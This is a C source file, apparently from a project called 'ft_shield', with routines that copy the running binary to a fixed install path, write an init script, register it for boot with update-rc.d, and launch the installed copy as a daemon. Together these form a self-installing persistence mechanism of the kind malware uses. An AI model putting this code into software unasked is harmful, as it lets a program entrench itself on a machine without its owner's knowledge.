#include "ft_shield.h"

int	is_installed(void)
{
	char	buf[PATH_MAX];
	ssize_t	n;

	n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
	if (n < 0)
		return (0);
	buf[n] = '\0';
	return (strcmp(buf, INSTALL_PATH) == 0);
}

int	install_self(void)
{
	char		buf[4096];
	ssize_t		n;
	int		in;
	int		out;

	in = open("/proc/self/exe", O_RDONLY);
	if (in < 0)
		return (-1);
	out = open(TMP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (out < 0)
		return (close(in), -1);
	while ((n = read(in, buf, sizeof(buf))) > 0)
	{
		if (write(out, buf, (size_t)n) != n)
		{
			close(in);
			close(out);
			unlink(TMP_PATH);
			return (-1);
		}
	}
	close(in);
	if (n < 0)
	{
		close(out);
		unlink(TMP_PATH);
		return (-1);
	}
	fchmod(out, 0755);
	close(out);
	if (rename(TMP_PATH, INSTALL_PATH) != 0)
	{
		unlink(TMP_PATH);
		return (-1);
	}
	return (0);
}

int	install_service(void)
{
	int	fd;

	fd = open(INIT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0)
		return (-1);
	if (write(fd, g_init_script, strlen(g_init_script)) < 0)
	{
		close(fd);
		return (-1);
	}
	fchmod(fd, 0755);
	close(fd);
	if (system("update-rc.d ft_shield defaults >/dev/null 2>&1") == -1)
		return (-1);
	return (0);
}

void	spawn_daemon(void)
{
	pid_t	pid;

	pid = fork();
	if (pid != 0)
		return ;
	execve(INSTALL_PATH, (char *[]){INSTALL_PATH, NULL}, environ);
	_exit(0);
}

